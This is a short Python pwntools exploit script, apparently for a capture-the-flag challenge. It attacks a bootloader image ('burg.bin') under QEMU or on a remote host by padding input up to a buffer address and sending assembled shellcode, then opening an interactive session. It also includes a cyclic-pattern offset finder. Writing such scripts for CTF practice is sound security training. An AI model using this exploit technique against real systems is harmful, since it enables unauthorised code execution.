#!/usr/bin/python3

from pwn import *
import sys
import os
from ctypes import CDLL

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = ""

gdbscript = '''
break *0x7c74
'''

libcx = CDLL("libc.so.6")
# now = int(floor(time.time()))
# libcx.srand(now)
# print(libcx.rand())

def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    if (args.GDB):
        pp = process(["/sbin/qemu-system-x86_64", "-nographic", "-serial", "mon:stdio", "-fda", "burg.bin", "-S", "-s"])
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(["/sbin/qemu-system-x86_64", "-nographic", "-serial", "mon:stdio", "-fda", "burg.bin"])
    return pp

def unpack_ptr(ptr):
    if (len(ptr) < 8):
        ptr += (8 - len(ptr)) * b"\x00"
    return (u64(ptr))

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

def assemble(file):
    os.system(f"nasm -f bin {file} -o pay.bin")
    fpay = open("pay.bin", "rb")
    pay = fpay.read()
    return pay;

def exploit():
    log.info("alright")
    pp.recvuntil(b">> ")
    username_addr = 0x82e0
    retaddr = 0x7c75
    pstr_addr = 0x7e9f
    scode = (b"\x7f" * (username_addr - retaddr))
    scode += assemble("pay.s")
    scode += b"\x0d"
    pp.send(scode)
    pp.recvuntil(b">> ")
    pp.send(b"dummy\x0d")

    pp.interactive()
    

# if (args.REMOTE):
#     libc = ELF("./libc.so.6")
# else:
#     libc = ELF("/usr/lib/libc.so.6")
# libcrops = ROP(libc)
# elf = context.binary = ELF(binary)
pp = init()
exploit()
